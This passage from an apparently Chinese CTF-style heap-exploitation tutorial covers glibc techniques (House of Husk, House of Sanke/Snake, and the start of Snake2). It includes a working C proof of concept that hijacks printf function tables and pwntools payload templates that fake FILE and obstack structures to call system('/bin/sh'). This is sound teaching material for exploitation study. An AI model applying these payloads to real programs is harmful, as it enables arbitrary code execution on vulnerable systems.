class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is a Proof-of-Concept for House of Husk</span></span><br><span class="line"><span class="comment"> * This PoC is supposed to be run with libc-2.27.</span></span><br><span class="line"><span class="comment"> gcc poc.c -o poc -no-pie -g</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA       0x3ebc40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA_DELTA 0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_MAX_FAST  0x3ed940</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_FUNCTABLE 0x3f0738</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_ARGINFO   0x3ec870</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ONE_GADGET       0x10a2fc</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> libc_base;</span><br><span class="line">  <span class="type">char</span> *a[<span class="number">10</span>];</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); </span><br><span class="line">  a[<span class="number">1</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_FUNCTABLE - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">2</span>] = <span class="built_in">malloc</span>(offset2size(PRINTF_ARGINFO - MAIN_ARENA));</span><br><span class="line">  a[<span class="number">3</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); </span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">0</span>]);</span><br><span class="line">  libc_base = *(<span class="type">unsigned</span> <span class="type">long</span>*)a[<span class="number">0</span>] - MAIN_ARENA - MAIN_ARENA_DELTA;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;libc @ 0x%lx\n&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">2</span>] + (<span class="string">&#x27;X&#x27;</span> - <span class="number">2</span>) * <span class="number">8</span>) = libc_base + ONE_GADGET;</span><br><span class="line"></span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">long</span>*)(a[<span class="number">0</span>] + <span class="number">8</span>) = libc_base + GLOBAL_MAX_FAST - <span class="number">0x10</span>;</span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); </span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">free</span>(a[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%X&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="例题-8"><a href="#例题-8" class="headerlink" title="例题"></a>例题</h2><p><strong>34c4_readme_revenge</strong></p><h1 id="house-of-sanke"><a href="#house-of-sanke" class="headerlink" title="house of sanke"></a>house of sanke</h1><h2 id="概要-19"><a href="#概要-19" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>此利用与<code>house of apple</code>、<code>house of cat</code>、<code>house of emma</code>等利用一样，利用了修改虚表指针的方法。主要思路就是修改虚表指针为<code>_IO_obstack_jumps</code>实现攻击。</p><p><strong>利用条件:</strong></p><ol><li>能修改<code>stdout</code>、<code>stdin</code>、<code>stderr</code>其中一个<code>_IO_FILE_plus</code>结构(fastbin attack或tcachebin attack)或劫持 <code>_IO_list_all</code>。(如<code>large bin attack</code>、<code>tcache stashing unlink attack</code>、<code>fastbin reverse into tcache</code>)</li><li>能够触发<code>IO</code>流，执行<code>IO</code>相关函数。</li><li>能够泄露堆地址和<code>libc</code>基址。</li></ol><p><strong>利用效果:</strong>程序流执行</p><p><strong>有效版本:</strong>2.36及以前,2,37去除了_IO_obstack_jumps</p><h2 id="原理-19"><a href="#原理-19" class="headerlink" title="原理"></a>原理</h2><p>在glibc/malloc/obstack.h中声定义一个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obstack</span>          /* <span class="title">control</span> <span class="title">current</span> <span class="title">object</span> <span class="title">in</span> <span class="title">current</span> <span class="title">chunk</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">long</span> chunk_size;              <span class="comment">/* preferred size to allocate chunks in */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">chunk</span>;</span> <span class="comment">/* address of current struct obstack_chunk */</span></span><br><span class="line">  <span class="type">char</span> *object_base;            <span class="comment">/* address of object we are building */</span></span><br><span class="line">  <span class="type">char</span> *next_free;              <span class="comment">/* where to add next char to current object */</span></span><br><span class="line">  <span class="type">char</span> *chunk_limit;            <span class="comment">/* address of char after current chunk */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    PTR_INT_TYPE tempint;</span><br><span class="line">    <span class="type">void</span> *tempptr;</span><br><span class="line">  &#125; temp;                       <span class="comment">/* Temporary for some macros.  */</span></span><br><span class="line">  <span class="type">int</span> alignment_mask;           <span class="comment">/* Mask of alignment for each object. */</span></span><br><span class="line">  <span class="comment">/* These prototypes vary based on &#x27;use_extra_arg&#x27;, and we use</span></span><br><span class="line"><span class="comment">     casts to the prototypeless function type in all assignments,</span></span><br><span class="line"><span class="comment">     but having prototypes here quiets -Wstrict-prototypes.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *(*<span class="title">chunkfun</span>) (<span class="title">void</span> *, <span class="title">long</span>);</span></span><br><span class="line">  <span class="type">void</span> (*freefun) (<span class="type">void</span> *, <span class="keyword">struct</span> _obstack_chunk *);</span><br><span class="line">  <span class="type">void</span> *extra_arg;              <span class="comment">/* first arg for chunk alloc/dealloc funcs */</span></span><br><span class="line">  <span class="type">unsigned</span> use_extra_arg : <span class="number">1</span>;     <span class="comment">/* chunk alloc/dealloc funcs take extra arg */</span></span><br><span class="line">  <span class="type">unsigned</span> maybe_empty_object : <span class="number">1</span>; <span class="comment">/* There is a possibility that the current</span></span><br><span class="line"><span class="comment">      chunk contains a zero-length object.  This</span></span><br><span class="line"><span class="comment">      prevents freeing the chunk if we allocate</span></span><br><span class="line"><span class="comment">      a bigger chunk to replace it. */</span></span><br><span class="line">  <span class="type">unsigned</span> alloc_failed : <span class="number">1</span>;      <span class="comment">/* No longer used, as we now call the failed</span></span><br><span class="line"><span class="comment">     handler on error, but retained for binary</span></span><br><span class="line"><span class="comment">     compatibility.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其又被包装于glibc/libcio/obprintf.c中的_IO_obstack_file结构体中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_obstack_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">file</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>简单来说，就是给<code>_IO_FILE_plus</code><strong>追加了一个指向<code>obstack</code>结构体的指针</strong>。</p><p><strong>_IO_obstack_jumps</strong></p><p>由上可知，<code>vtable</code>必须合法，我们观察以下<code>vtable</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* the jump table.  */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_obstack_jumps</span> <span class="title">libio_vtable</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, _IO_obstack_overflow), <span class="comment">//函数一</span></span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_obstack_xsputn),<span class="comment">//函数二</span></span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可知，该<code>vtable</code>内只存在两个函数，分别为<code>_IO_obstack_overflow</code>、<code>_IO_obstack_xsputn</code>。</p><p>接下来我们对<code>_IO_obstack_xsputn</code>这个函数进行分析(glibc/libcio/obprintf.c)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span></span><br><span class="line">_IO_obstack_xsputn (FILE *fp, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((<span class="keyword">struct</span> _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need some more memory.  First shrink the buffer to the</span></span><br><span class="line"><span class="comment"> space we really currently need.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now grow for N bytes, and put the data there.  */</span></span><br><span class="line">      obstack_grow (obstack, data, n);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">      fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">      fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">      size = obstack_room (obstack);</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">      <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, size);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = __mempcpy (fp-&gt;_IO_write_ptr, data, n);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察该函数，首先获得<code>_IO_obstack_file</code>结构体中的<code>obstack</code>结构体指针作为后面函数运行的参数。然后<strong>要绕过fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end</strong>，执行<code>obstack_blank_fast(obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);</code>，</p><p>而<code>obstack_blank_fast</code>是个宏定义源码如下：</p><p><code>#define obstack_blank_fast(h, n) ((h)-&gt;next_free += (n))</code></p><p>对此<strong>不过多关注</strong>。然后执行<code>obstack_grow</code>，<code>obstack_grow</code>也是一个宏源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> obstack_grow(OBSTACK, where, length)      \</span></span><br><span class="line"><span class="meta">  __extension__      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);      \</span></span><br><span class="line"><span class="meta">       int __len = (length);      \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (__o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)      \</span></span><br><span class="line"><span class="meta"> _obstack_newchunk (__o, __len);      \</span></span><br><span class="line"><span class="meta">       memcpy (__o-&gt;next_free, where, __len);      \</span></span><br><span class="line"><span class="meta">       __o-&gt;next_free += __len;      \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure><p>可以看到，当<strong>_o-&gt;next_free + <strong>len &gt; </strong>o-&gt;chunk_limit</strong>时，调用<code>_obstack_newchunk</code>，<code>_obstack_newchunk</code>函数源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  <span class="type">long</span> new_size;</span><br><span class="line">  <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="type">long</span> i;</span><br><span class="line">  <span class="type">long</span> already;</span><br><span class="line">  <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">    [....]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对此，我们关注<code>CALL_CHUNKFUN</code>这个宏定义，<code>CALL_CHUNKFUN</code>源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> CALL_CHUNKFUN(h, size) \</span></span><br><span class="line"><span class="meta">  (((h)-&gt;use_extra_arg)      \</span></span><br><span class="line"><span class="meta">   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))      \</span></span><br><span class="line"><span class="meta">   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))</span></span><br></pre></td></tr></table></figure><p>当use_extra_arg不为0,可以控制任意函数执行,并且第一个参数可控,第二个也可控不过比较麻烦也没必要</p><h3 id="绕过条件"><a href="#绕过条件" class="headerlink" title="绕过条件"></a>绕过条件</h3><p>总结一下需要绕过的条件：</p><ul><li><code>fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end</code></li><li><code>_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit</code></li><li><code>(h)-&gt;use_extra_arg</code>不为0</li></ul><h3 id="函数调用链"><a href="#函数调用链" class="headerlink" title="函数调用链"></a>函数调用链</h3><p>从调用<code>_IO_obstack_xsputn</code>开始分析，假设满足上述所有需要绕过的所有条件，得以下调用链：</p><ul><li>_IO_obstack_xsputn<ul><li>obstack_grow<ul><li>_obstack_newchunk<ul><li>CALL_CHUNKFUN(一个宏定义)<ul><li>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</li></ul></li></ul></li></ul></li></ul></li></ul><h2 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h2><h3 id="模板方案1"><a href="#模板方案1" class="headerlink" title="模板方案1"></a>模板方案1</h3><p>该方案主要是利用比较少的字节完成攻击（将fp和obstack指向同个地址）</p><ul><li>利用<code>largebin attack</code>伪造<code>_IO_FILE</code>，记完成伪造的<code>chunk</code>为<code>A</code>（或者别的手法）</li><li><code>chunk A</code>内偏移为0x18处设为1（<code>next_free</code>)</li><li><code>chunk A</code>内偏移为0x20处设为0（<code>chunk_limit</code>）</li><li><code>chunk A</code>内偏移为0x28处设为1（<code>_IO_write_ptr</code>)</li><li><code>chunk A</code>内偏移为0x30处设为0 (<code>_IO_write_end</code>)</li><li><code>chunk A</code>内偏移为0x38处设为<code>system</code>函数的地址</li><li><code>chunk A</code>内偏移为0x48处设为<code>&amp;/bin/sh</code></li><li><code>chunk A</code>内偏移为0x50处设为1 (<code>use_extra_arg</code>)</li><li><code>chunk A</code>内偏移为0xd8处设为<code>&amp;_IO_obstack_jumps+0x20</code>,根据调用偏移决定</li><li><code>chunk A</code>内偏移为0xe0处设置<code>chunk A</code>的地址作为<code>obstack</code>结构体</li></ul><p>可参考<code>payload</code>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = flat(</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x18</span>:<span class="number">1</span>,</span><br><span class="line"><span class="number">0x20</span>:<span class="number">0</span>,</span><br><span class="line"><span class="number">0x28</span>:<span class="number">1</span>,</span><br><span class="line"><span class="number">0x30</span>:<span class="number">0</span>,</span><br><span class="line"><span class="number">0x38</span>:address_for_call,</span><br><span class="line"><span class="number">0x48</span>:address_for_rdi,</span><br><span class="line"><span class="number">0x50</span>:<span class="number">1</span>,</span><br><span class="line"><span class="number">0xd8</span>:&amp;_IO_obstack_jumps+<span class="number">0x20</span>，</span><br><span class="line"><span class="number">0xe0</span>:this_mem_address,</span><br><span class="line">&#125;,</span><br><span class="line">filler = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="模板方案2"><a href="#模板方案2" class="headerlink" title="模板方案2"></a>模板方案2</h3><p>将fp与obstack分开指向不同的地址，方便区分，而易于理解</p><ul><li>利用<code>largebin attack</code>伪造<code>_IO_FILE</code>，记完成伪造的<code>chunk</code>为<code>A</code>（或者别的手法）</li><li>记一块可控堆内存为B</li><li><code>chunk A</code>内偏移为0x28处设为1（<code>_IO_write_ptr</code>)</li><li><code>chunk A</code>内偏移为0x30处设为0 (<code>_IO_write_end</code>)</li><li><code>chunk A</code>内偏移为0xe0处设置<code>chunk B</code>的地址作为<code>obstack</code>结构体</li><li><code>chunk A</code>内偏移为0xd8处设为<code>&amp;_IO_obstack_jumps+0x20</code>,根据调用偏移决定</li><li><code>chunk B</code>内偏移为0x18处设为1（<code>next_free</code>)</li><li><code>chunk B</code>内偏移为0x20处设为0（<code>chunk_limit</code>）</li><li><code>chunk B</code>内偏移为0x38处设为<code>system</code>函数的地址</li><li><code>chunk B</code>内偏移为0x48处设为<code>&amp;/bin/sh</code></li><li><code>chunk B</code>内偏移为0x50处设为1 (<code>use_extra_arg</code>)</li></ul><p>可参考的<code>payload</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">obstack_pd = flat(</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x18</span>:<span class="number">0x1</span>,</span><br><span class="line"><span class="number">0x20</span>:<span class="number">0</span>,</span><br><span class="line"><span class="number">0x38</span>:libc_base + libc.sym[<span class="string">&quot;system&quot;</span>],</span><br><span class="line"><span class="number">0x48</span>:binsh,</span><br><span class="line"><span class="number">0x50</span>:<span class="number">1</span>,</span><br><span class="line">&#125;,</span><br><span class="line">filler = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x28</span>:<span class="number">1</span>,</span><br><span class="line"><span class="number">0x30</span>:<span class="number">0</span>,</span><br><span class="line"><span class="number">0xd8</span>:libc_base + get_IO_str_jumps() - <span class="number">0x300</span> + <span class="number">0x20</span>,</span><br><span class="line"><span class="number">0xe0</span>:heap_base + <span class="number">0x250</span> + <span class="number">0x100</span>,</span><br><span class="line"><span class="number">0x100</span>:obstack_pd</span><br><span class="line">&#125;,</span><br><span class="line">filler = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="house-of-snake2"><a href="#house-of-snake2" class="headerlink" title="house of snake2"></a>house of snake2</h1><h2 id="概要-20"><a href="#概要-20" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong><code>glibc2.37</code>删除了<code>_IO_obstack_jumps</code>这个<code>vtable</code>。但是在源码里obstack结构体依然存在,在此，<code>house of snake</code>利用链与<code>house of apple</code>、<code>house of cat</code>、<code>house of emma</code>等利用一样，利用了修改虚表指针的方法。主要思路就是伪造相关结构体并且修改虚表指针为<code>_IO_printf_buffer_as_file_jumps</code>实现攻击</p><p><strong>利用条件:</strong></p><ol><li>能修改<code>stdout</code>、<code>stdin</code>、<code>stderr</code>其中一个<code>_IO_FILE_plus</code>结构(fastbin attack或tcachebin attack)或劫持 <code>_IO_list_all</code>。(如<code>large bin attack</code>、<code>tcache stashing unlink attack</code>、<code>fastbin reverse into tcache</code>)</li><li>能够触发<code>IO</code>流，执行<code>IO</code>相关函数。</li><li>能够泄露堆地址和<code>libc</code>基址。</li></ol><p><strong>利用效果:</strong>程序流执行</p><p><strong>有效版本:</strong>ALL</p><h2 id="原理-20"><a href="#原理-20" class="headerlink" title="原理"></a>原理</h2><p>house of snake2也利用了obstack这个结构体</p><p>在house of snake中obstack被包装于_IO_obstack_file中</p><p>但在2.37以后被包装于__printf_buffer_obstack结构体中(glibc/libcio/obstack.c)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_obstack</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> <span class="title">base</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* obstack_1grow is called for compatibility reasons.  This needs</span></span><br><span class="line"><span class="comment">     one extra character, and this is the backing store for it.  */</span></span><br><span class="line">  <span class="type">char</span> ch;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *write_base; <span class="number">0x0</span><span class="number">-0x8</span></span><br><span class="line">  <span class="type">char</span> *write_ptr;<span class="number">0x8</span><span class="number">-0x10</span></span><br><span class="line">  <span class="type">char</span> *write_end;<span class="number">0x10</span><span class="number">-0x18</span></span><br><span class="line">  <span class="type">uint64_t</span> written;<span class="number">0x18</span><span class="number">-0x20</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">printf_buffer_mode</span> <span class="title">mode</span>;</span> <span class="number">0x20</span><span class="number">-0x24</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span 